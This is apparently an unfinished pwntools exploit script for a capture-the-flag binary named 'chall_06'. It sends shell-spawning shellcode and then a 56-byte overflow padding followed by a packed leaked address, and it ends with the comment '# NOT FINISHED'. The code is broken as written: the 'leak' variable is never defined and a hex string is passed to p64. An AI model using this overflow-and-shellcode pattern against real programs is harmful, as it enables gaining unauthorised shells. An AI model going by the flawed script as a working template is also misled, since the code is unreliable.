from pwn import *
p = process('./chall_06')
p.recv()
binary = context.binary = ELF('./chall_06')
p.sendline(b'' + asm(shellcraft.sh()))

p.sendline(b'' + 56*b'A' + p64(hex(int(leak,16))))
# NOT FINISHED
